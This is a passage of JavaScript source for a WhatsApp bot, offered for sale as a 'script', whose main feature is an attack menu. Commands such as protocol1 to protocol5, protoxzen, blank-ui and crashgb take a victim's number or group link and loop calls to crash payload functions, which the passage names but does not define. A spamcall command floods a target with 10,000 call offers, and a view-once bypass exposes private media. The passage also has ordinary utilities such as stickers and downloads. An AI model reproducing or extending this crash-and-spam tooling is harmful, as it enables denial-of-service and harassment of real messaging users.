      title: "𝐒𝐄𝐋𝐋𝐄𝐂𝐓 - 𝐌𝐄𝐍𝐔",
      sections: [
        {
          title: "⌜ 𝐑𝐄𝐂𝐎𝐌𝐌𝐄𝐍𝐃𝐄𝐃 ⌟",
          highlight_label: "〽️",
          rows: [
            {
              header: "",
              title: "𝕭𝖚𝖌 𝕸𝖊𝖓𝖚",
              description: "",
              id: `.bugmenu`
            },
            {
              header: "",
              title: "𝕺𝖜𝖓𝖊𝖗 𝕸𝖊𝖓𝖚",
              description: "",
              id: `.ownmenu`
            }
          ]
        },
        {
          title: "⌜ 𝐂𝐫𝐞𝐝𝐳 Ϟ 𝐇𝐚𝐥𝐥 ⌟",
          highlight_label: "",
          rows: [
            {
              header: "",
              title: "𝕿𝖍𝖆𝖓𝖐𝖘 𝕿𝖔",
              description: "",
              id: `.tqto`
            }
          ]
        },
        {
          title: "⌜ 𝐆𝐲𝐳𝐞𝐧 - 𝐌𝐬𝐛𝐫𝐞𝐪 ⌟",
          highlight_label: "🌹",
          rows: [
            {
              header: "",
              title: "𝐆𝐲𝐳𝐞𝐧-𝐗",
              description: "",
              id: `.owner`
            },
            {
              header: "",
              title: "𝐗-𝐆𝐲𝐳𝐞𝐧",
              description: "",
              id: `.buysc`              
            }
          ]
        }
      ]
    })
  },
  viewOnce: true
};

buttonMessage.buttons.push(nativeFlowButton);

return await sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
		break

case 'xbug':
case 'type-bug': {
if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
if (!q) return kontolreply(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
    mentionedJid = m.mentionedJid[0]; // ambil yang pertama ditag
} else {
    let jidx = q.replace(/[^0-9]/g, "");
    if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
    mentionedJid = `${jidx}@s.whatsapp.net`;
}

let target = mentionedJid;
    
const buttons = [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
    }
  },
  {
    buttonId: '.buysc',
    buttonText: {
      displayText: '༑⌁⃰𝐁𝐮͢𝐲 𝑺͢𝒄𝒓𝒊ͯ͢𝒑𝒕ཀ͜͡'
    }
  }
];

const buttonMessage = {
  image: { url: RandomBugs },
  caption: `*— ( 🐉 ) ⾷ Olaa.. ${info}*
\`\`\`Selamat Datang Di Menu Kami Ya Developer :  𝐆𝐲𝐳𝐞𝐧 𝐌𝐬𝐛𝐫𝐞𝐰   \`\`\`

\`クラッシャーフォーエックス\`
*-# Attack : ${target}*
*Sellect This Type Bugs 💯*`,
  footer: 'VANZ INVITCUS ',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363417794292944@newsletter",
      serverMessageId: null,
      newsletterName: `VANZ INVITCUS  `
    },
    mentionedJid: ['13135550002@s.whatsapp.net'],
  },
  viewOnce: true
};

const nativeFlowButton = {
  buttonId: 'action',
  buttonText: { displayText: 'Options' },
  type: 4,
  nativeFlowInfo: {
    name: 'single_select',
    paramsJson: JSON.stringify({
      title: "Sellect Type-Bugs",
      sections: [
        {
          title: "⌜ 𝐗-𝐆𝐘𝐙𝐄𝐍 ⌟",
          highlight_label: "〽️",
          rows: [
            {
              header: "",
              title: "ᴘʀᴏᴛᴏ 1",
              description: "",
              id: `.protocol1 ${target}`
            },
            {
              header: "",
              title: "ᴘʀᴏᴛᴏ 2",
              description: "",
              id: `.protocol2 ${target}`
            },
            {
              header: "",
              title: "ᴘʀᴏᴛᴏ 3",
              description: "",
              id: `.protocol3 ${target}`
            },
            {
              header: "",
              title: "ᴘʀᴏᴛᴏ 5",
              description: "",
              id: `.protocol5 ${target}` 
            },
            {
              header: "",
              title: "ᴘʀᴏᴛᴏᴄᴏʟ v1",
              description: "",
              id: `.protocol ${target}`   
            },
            {
              header: "",
              title: "ᴘʀᴏᴛᴏᴄᴏʟ v2",
              description: "",
              id: `.protoxzen ${target}`                                      
            }
          ]
        }
      ]
    })
  },
  viewOnce: true
};

buttonMessage.buttons.push(nativeFlowButton);

return await sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}

		break
		
case 'spammenu': {
if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
if (!q) return kontolreply(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
    mentionedJid = m.mentionedJid[0]; // ambil yang pertama ditag
} else {
    let jidx = q.replace(/[^0-9]/g, "");
    if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
    mentionedJid = `${jidx}@s.whatsapp.net`;
}

let target = mentionedJid;
    
const buttons = [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
    }
  },
  {
    buttonId: '.buysc',
    buttonText: {
      displayText: '༑⌁⃰𝐁𝐮͢𝐲 𝑺͢𝒄𝒓𝒊ͯ͢𝒑𝒕ཀ͜͡'
    }
  }
];

const buttonMessage = {
  image: { url: RandomBugs },
  caption: `*— ( 🐉 ) ⾷ Olaa.. ${info}*
\`\`\`Selamat Datang Di Menu Kami Ya Developer : 𝐆𝐘𝐙𝐄𝐍 𝐌𝐒𝐁𝐑𝐄𝐖  \`\`\`

\`クラッシャーフォーエックス\`
*-# Attack : ${target}*
*Sellect This Type spam 💯*`,
  footer: 'VANZ INVITCUS ',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363417794292944@newsletter",
      serverMessageId: null,
      newsletterName: `VANZ INVITCUS `
    },
    mentionedJid: ['13135550002@s.whatsapp.net'],
  },
  viewOnce: true
};

const nativeFlowButton = {
  buttonId: 'action',
  buttonText: { displayText: 'Options' },
  type: 4,
  nativeFlowInfo: {
    name: 'single_select',
    paramsJson: JSON.stringify({
      title: "Sellect Type-Bugs",
      sections: [
        {
          title: "⌜ 𝐗-𝐆𝐘𝐙𝐄𝐍 ⌟",
          highlight_label: "〽️",
          rows: [
            {                        
              header: "",
              title: "𝐒𝐩𝐚𝐦𝐏𝐚𝐢𝐫",
              description: "",
              id: `.spam-pair ${target}|1000`
            },
            {
              header: "",
              title: "𝐒𝐩𝐚𝐦𝐂𝐚𝐥𝐥",
              description: "",
              id: `.spamcall ${target}`
            }
          ]
        }
      ]
    })
  },
  viewOnce: true
};

buttonMessage.buttons.push(nativeFlowButton);

return await sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}

break;

case 'crashgb':
case 'blankgb':
case 'forclosegb':
case 'stuckgb': {
  if (!DevOnly && !PremOnly) return xreplyWithButton(mess.owner);
  if (!q) return kontolreply(example("https://chat.whatsapp.com/"));

  try {
    await sleep(1000);
    xreplybugbutton(`Bot successfully sends a virus message`);

    let result = args[0].split("https://chat.whatsapp.com/")[1];
    let target = await sock.groupAcceptInvite(result);

    for (let i = 0; i < 1; i++) {
      await ComboIos(target)
      await ComboDelay(target)
      await DelayXFreeze(target)
      await ComboUi(target)
    }
  } catch (err) {
    console.error(err);
    kontolreply("Failed to send virus. Make sure the number or link is valid.");
  }
}
// Helper function to get the phone number
async function getPhoneNumber() {
  if (m.mentionedJid?.length > 0) {
    return m.mentionedJid[0];
  } else {
    let raw = qtext.split("|")[0].replace(/[^0-9]/g, '');
    if (raw.startsWith("0")) return kontolreply(`Gunakan format internasional: 628xxx`);
    return `${raw}@s.whatsapp.net`;
  }
}

// Add Owner / Premium Handler
async function addOwnerOrPremium(commandType) {
  if (!DevOnly) return xreplyWithButton(mess.owner);

  let numero = await getPhoneNumber();
  let isValid = await sock.onWhatsApp(numero);
  if (isValid.length === 0) return kontolreply(example("628xxx or tag @user"))

  if (commandType === 'addowner' || commandType === 'addown') {
    if (!owner.includes(numero)) owner.push(numero);
    if (!Premium.includes(numero)) Premium.push(numero);
    fs.writeFileSync('./account/Own.json', JSON.stringify(owner, null, 2));
    fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium, null, 2));
    xreplyWithButton(`Number ${numero.split('@')[0]} berhasil ditambahkan sebagai Owner & Premium!`);
  } else if (commandType === 'addpremium' || commandType === 'addprem') {
    if (!Premium.includes(numero)) Premium.push(numero);
    fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium, null, 2));
    xreplyWithButton(`Number ${numero.split('@')[0]} berhasil ditambahkan ke Premium!`);
  }
}

// Delete Owner / Premium Handler
async function deleteOwnerOrPremium(commandType) {
  if (!DevOnly) return xreplyWithButton(mess.owner);

  let numero = await getPhoneNumber();
  let indexOwner = owner.indexOf(numero);
  let indexPremium = Premium.indexOf(numero);

  if (indexOwner === -1 && indexPremium === -1) {
    return kontolreply(`Nomor ${numero.split('@')[0]} tidak ditemukan dalam database.`);
  }

  if (commandType === 'delowner' || commandType === 'delown') {
    if (indexOwner !== -1) owner.splice(indexOwner, 1);
    if (indexPremium !== -1) Premium.splice(indexPremium, 1);
    fs.writeFileSync('./account/Own.json', JSON.stringify(owner, null, 2));
    fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium, null, 2));
    xreplyWithButton(`Number ${numero.split('@')[0]} berhasil dihapus dari database!`);
  } else if (commandType === 'delpremium' || commandType === 'delprem') {
    if (indexPremium !== -1) {
      Premium.splice(indexPremium, 1);
      fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium, null, 2));
      xreplyWithButton(`Number ${numero.split('@')[0]} berhasil dihapus dari Premium!`);
    } else {
      kontolreply(`Nomor ${numero.split('@')[0]} tidak ada dalam database Premium.`);
    }
  }
}

break
  case 'addowner':
  case 'addown':
    await addOwnerOrPremium('addowner');
    break;

  case 'delowner':
  case 'delown':
    await deleteOwnerOrPremium('delowner');
    break;

  case 'addpremium':
  case 'addprem':
    await addOwnerOrPremium('addpremium');
    break;

  case 'delpremium':
  case 'delprem':
    await deleteOwnerOrPremium('delpremium');
  break;
  
case 'qc': {
  if (!q) return kontolreply(`Send command with text. ${prefix + command} Hai`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await sock.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  sock.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;
case "play": {
        if (!qtext) return kontolreply(`send title song\n example ${prefix + command} ransom`);
        let search = await yts(qtext);
        let telaso = search.all[0].url;
        let puqi = await VocalRemover(telaso);
          let vocalAudio = puqi.stuffs.find(item => item.bizType === 'origin').key;
          sock.sendMessage(m.chat, {
              audio: { url : vocalAudio },
              mimetype: 'audio/mpeg', 
              ptt: true
          },{ quoted:m })
        }
      break
case "rvo":
case "readvo":
case 'readviewonce':
case 'readviewoncemessage': {

  if (!m.quoted) return kontolreply("Reply to an image/video that you want to view");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return kontolreply("This is not a view-once message.");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return kontolreply("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await sock.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await sock.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
}
break
case "setpp": {
  if (!DevOnly) return 
  if (!m.quoted) return kontolreply("Reply to an image with this command to set profile picture!");
  
  try {
    const media = await sock.downloadAndSaveMediaMessage(m.quoted);
    const { img } = await generateProfilePicture(media);

    await sock.query({
      tag: "iq",
      attrs: {
        to: BotNum,
        type: "set",
        xmlns: "w:profile:picture"
      },
      content: [{
        tag: "picture",
        attrs: {
          type: "image"
        },
        content: img
      }]
    });

    await xreplyWithButton("Profile picture set successfully!");
  } catch (error) {
    console.error(error);
    await xreplyWithButton("Failed to set profile picture. Make sure you replied to an image and try again.");
  }
}
break
case "delpp": {
if (!DevOnly) return 
  sock.removeProfilePicture(sock.user.id);
  xreplyWithButton("Success Delete Profile Picture");
}
break;
case 'tovn': {
  if (!/video/.test(mime) && !/audio/.test(mime)) return kontolreply(`Reply media with caption ${prefix + command}`);
  if (!quoted) return kontolreply(`Reply video/vn with caption ${prefix + command}`);
  
  let media = await quoted.download();
  let { toAudio } = require('./database/pusat/Data4');
  let audio = await toAudio(media, 'mp4');
  
  sock.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
}
break;
case 'tagall': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  sock.sendMessage(from, { text: q ? q : 'Apocalypse Always Stay In Here', mentions: participants.map(a => a.id) }, { quoted: m });
}
break;
case 'kick': {
if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  if (!Adm) return 

  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!q) return kontolreply("Send number / tag users ");
  await sock.groupParticipantsUpdate(from, [users], 'remove');
}
break;
case 'linkgroup': case 'linkgc': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  

  let responsegg = await sock.groupInviteCode(from);
  sock.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true });
}
break;
case 'resetlinkgc': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  
  sock.groupRevokeInvite(from);
}
break;
case 'public': {
  if (!DevOnly) return 
  sock.public = true;
  xreplyWithButton(`*Success Change Mode Self To Public*`);
}
break;
case 'self': case 'private': {
  if (!DevOnly) return
  sock.public = false;
  xreplyWithButton(`*Success Change Mode Public To Self*`);
}
break
case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return kontolreply(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return kontolreply('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return kontolreply('Failed to download media!');
    }

    const uploadImage = require('./database/pusat/Data6');
    const uploadFile = require('./database/pusat/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return kontolreply('Failed to upload media!');
    }

    xreplyWithButton(`(no expiration date/unknown)\n ${link}`)
}
break
case 'sticker': case 's': {
  if (!quoted) return xreplyWithButton(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await sock.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return kontolreply('max 10s');
    
    let media = await quoted.download();
    let encmedia = await sock.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return kontolreply(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}
break;
case 'brat': {
            if (!q) return xreplyWithButton(`Send command with text. ${prefix + command} Rizxvelz`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${q}`
            await makeStickerFromUrl(imageUrl, sock, m);
        }
       break
case 'tes':
case 'status': {
xreplyWithButton(`*Connect*`)
}
break
//END
case "joingc": case "join": {
if (!DevOnly) return xreplyWithButton(`woi, lu siapa?`)
if (!q) return kontolreply(example("linkgcnya"))
let result = args[0].split("https://chat.whatsapp.com/")[1];
let target = await sock.groupAcceptInvite(result);
m.reply(`Berhasil`)
}
break



//TIKTOK CASE		
case 'tiktok': 
      case'tt':{
        if (!qtext) return xreplyWithButton(`Send command with link. ${prefix + command} https://`);
         let res = await tiktok(qtext);          
         if (res && res.data && res.data.data) {
            let images = res.data.data.images || [];
            let play = res.data.data.play;
            let lagu = res.data.data.music

            const getMimeType = async (url) => {
                try {
                    const response = await axios.head(url);
                    return response.headers['content-type'];
                } catch (error) {
                    console.error(error);
                    return
                }
            };

            let mimeType = await getMimeType(play);
            
            if (mimeType && mimeType.startsWith('video/')) {
                await sock.sendMessage(m.chat, {
                    video: { url: play },
                    caption: "Successfully downloaded video from TikTok"
                },{quoted:m});
            } else if (images.length > 0) {
                let totalImages = images.length;
                let estimatedTime = totalImages * 4;
                let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
                await sock.sendMessage(m.chat, { text: message },{quoted:m});

                const sendImageWithDelay = async (url, index) => {
                    let caption = `Gambar ke-${index + 1}`;
                    await sock.sendMessage(m.chat, { image: { url }, caption: caption },{quoted:m});
                };
                await sock.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" },{quoted:m})

                for (let i = 0; i < images.length; i++) {
                    await sendImageWithDelay(images[i], i);
                    await new Promise(resolve => setTimeout(resolve, 4000));
                }
            } else {
                console.log('No valid video or images found.');
                await sock.sendMessage(m.chat, {
                    text: "No media found or an error occurred while retrieving media."
                },{quoted:m});
            }
        } else {
            console.error('Error: Invalid response structure', res);
            await sock.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            },{quoted:m});
        }
      }
      break
      
// END
//META AI CASE

case 'meta-ai': {
  if (!qtext) return xreplyWithButton('Send Text / Question');
            try {
                const apiUrl = `https://restapii.rioooxdzz.web.id/api/metaai?message=${encodeURIComponent(qtext)}`;
                const response = await fetch(apiUrl);
                const mark = await response.json();

                const ress = mark.result.meta || 'Maaf, saya tidak bisa memahami permintaan Anda. Mungkin pertanyaanmu stress / nguawor';

                await sock.sendMessage(m.chat, { text: ress }, {quoted:m});
                
} catch (error) {
    console.error("Terjadi kesalahan segera hubungi developer!!!:", error.message);
}
}
break
case 'protocol3': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 10; i++) {
await protocol6(target)
await sleep(150);
await ProtoX(target);
await sleep(150);
await protocolbug6(target)
await sleep(150);
await ProtoX(target)
await sleep(150);
await protocol(target)
await sleep(150);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'protocol3': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 10; i++) {
await protocolbug6(target)
await sleep(150);
await ProtoX(target);
await sleep(150);
await protocolbug6(target)
await sleep(150);
await ProtoX(target)
await sleep(150);
await protocolbug6(target)
await sleep(150);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'protocol2': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 10; i++) {
await ProtoX(target);
await sleep(150);
await protocolbug5(target);
await sleep(150);
await ProtoX(target);
await sleep(150);
await protocolbug5(target);
await sleep(150);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'spamcall': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let r = 0; r < 10000; r++) {
await sendOfferCall(target)
await sendOfferVideoCall(target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'protocol1': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 10; i++) {
await ProtoX(target);
await sleep(150);
await protocolbug3(target);
await sleep(150);
await ProtoX(target);
await sleep(150);
await protocolbug3(target);
await sleep(150);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'protocol': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 10; i++) {
await protocolbug3(target);
await sleep(150);
await protocolbug5(target);
await sleep(150);
await protocolbug6(target);
await sleep(150);
await protocolbug8(target);
await sleep(150);
await ProtoX(target);
await sleep(150);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'protocol5': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 10; i++) {
await protocolbug8(target);
await sleep(150);
await ProtoX(target);
await sleep(150);
await protocolbug8(target);
await sleep(150);
await ProtoX(target);
await sleep(150);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'protoxzen': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐚𝐫𝐠𝐞𝐭 : *${lock}*
𖥂 𝐂𝐦𝐧𝐝 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 10; i++) {
await protocolzen(target);
await sleep(150);
await ProtoX(target);
await sleep(150);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'xandros-ui':
case 'blank-ui': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 20; i++) {
await ComboDelay(target);
await sleep(150);
await ComboUi(target);
await sleep(150);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply(`succes to send virus to ${target}`);
}
}
break
case 'xdelayui':
case 'frezechat': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*You are not a Premium User*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
